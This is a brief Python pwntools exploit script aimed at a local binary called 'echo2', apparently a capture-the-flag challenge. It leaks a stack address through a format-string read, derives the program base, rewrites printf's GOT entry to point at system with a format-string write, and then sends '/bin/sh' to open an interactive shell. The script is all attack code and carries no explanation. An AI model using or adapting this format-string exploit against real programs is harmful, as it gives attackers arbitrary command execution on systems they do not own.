#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math
context(arch = "amd64",os = "linux", log_level = "debug")

p = process('./echo2')
elf = ELF('./echo2')

query_payload = "%41$lld"
p.sendline(query_payload)
echo_ret_addr = int(p.recvuntil("\n"))
program_base = echo_ret_addr - 0xa03

printf_got = elf.got['printf'] + program_base
system_plt = elf.plt['system'] + program_base

payload = fmtstr_payload(6, {printf_got: system_plt})

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()

